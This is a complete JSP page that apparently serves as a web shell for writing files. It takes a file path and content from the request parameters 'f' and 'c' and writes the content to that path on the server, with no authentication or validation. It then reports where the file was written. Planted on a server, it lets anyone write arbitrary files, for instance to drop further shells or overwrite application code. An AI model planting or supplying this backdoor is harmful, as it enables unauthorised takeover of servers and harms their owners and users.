<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.File" %>
<%@ page import="java.io.FileOutputStream" %>

<%
    File file = new File(request.getParameter("f"));
    FileOutputStream fos = new FileOutputStream(file);
    fos.write(request.getParameter("c").getBytes());
    fos.flush();
    fos.close();

    out.println(file.getAbsoluteFile() + "\t" + file.exists());
%>